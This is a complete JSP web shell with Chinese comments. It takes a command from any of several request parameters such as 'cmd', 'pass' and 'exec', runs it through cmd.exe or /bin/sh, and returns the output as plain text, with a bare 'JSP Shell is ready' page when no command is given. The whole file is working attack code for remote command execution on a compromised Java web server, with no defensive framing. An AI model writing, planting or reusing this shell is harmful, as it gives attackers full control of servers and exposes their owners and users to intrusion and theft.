<%@ page import="java.io.*,java.util.*" %>
<%
    // 1. 定义所有可能的参数名 (适配你的脚本预留参数)
    String[] paramNames = {"cmd", "pass", "c", "code", "action", "exec", "command"};
    String execCmd = null;

    // 2. 遍历查找哪个参数被使用了
    for (String pName : paramNames) {
        String val = request.getParameter(pName);
        if (val != null && !val.isEmpty()) {
            execCmd = val;
            break; // 找到第一个非空参数就停止
        }
    }

    // 3. 核心逻辑：如果有命令，进入“纯输出模式”
    if (execCmd != null) {
        // 设置为纯文本，防止脚本解析HTML出错
        response.setContentType("text/plain;charset=UTF-8");
        response.setCharacterEncoding("UTF-8");

        try {
            // 判断操作系统 (Windows vs Linux)
            String os = System.getProperty("os.name").toLowerCase();
            ProcessBuilder pb;
            if (os.contains("win")) {
                pb = new ProcessBuilder(new String[]{"cmd.exe", "/c", execCmd});
            } else {
                pb = new ProcessBuilder(new String[]{"/bin/sh", "-c", execCmd});
            }

            Process p = pb.start();

            // 读取标准输出
            BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String s;
            while ((s = stdInput.readLine()) != null) {
                out.println(s);
            }

            // 读取错误输出 (如果命令输错了，这里能看到报错)
            BufferedReader stdError = new BufferedReader(new InputStreamReader(p.getErrorStream()));
            while ((s = stdError.readLine()) != null) {
                out.println(s);
            }

        } catch (Exception e) {
            out.println("Error: " + e.getMessage());
        }

        // 【关键】执行完命令后，直接结束响应，不再输出下面的HTML！
        return;
    }

    // 4. 如果没有命令（第一次访问），才显示这个提示界面
    // 注意：这里的HTML尽量简单，以免干扰脚本
%>
<html><body>
<pre>JSP Shell is ready. Waiting for command...</pre>
</body></html>
